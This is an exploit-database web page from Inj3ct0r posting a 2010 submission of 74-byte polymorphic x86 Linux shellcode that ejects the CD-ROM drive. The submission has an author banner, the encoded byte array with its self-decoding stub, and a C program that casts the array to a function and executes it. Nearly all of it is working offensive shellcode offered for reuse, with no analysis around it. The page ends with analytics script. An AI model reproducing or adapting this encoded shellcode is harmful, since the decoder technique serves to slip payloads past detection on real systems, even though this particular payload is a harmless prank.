<html><head><title>Linux/x86 - polymorphic cdrom ejecting - 74 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 74 bytes cdrom ejecting x86 linux polymorphic shellcode
Date   : Sat Jun  17 17:29:00 2010
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
                    mywisdom (devilzc0de.org), loneferret (offensive-security.com)
*/

char ejectcd[] = &quot;\xeb\x11\x5e\x31\xc9\xb1\x3e\x80\x6c\x0e\xff\x35\x80\xe9\x01&quot;
		 &quot;\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x9f\x40\x8d\xce\x87\x9f&quot;
		 &quot;\xa2\x9d\x98\x99\xa7\xa4\xbe\x16\x87\x9b\x9d\x98\xa9\x9d\x64&quot;
		 &quot;\x9a\x9f\x9a\x9d\x64\x97\x9e\xa3\x9d\x64\xaa\xa8\xa7\xbe\x18&quot;
		 &quot;\x87\x86\x88\xbe\x16\x02\xb5\x75\x02\xb5&quot;;

int main(void)
{
	(*(void(*)()) ejectcd)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
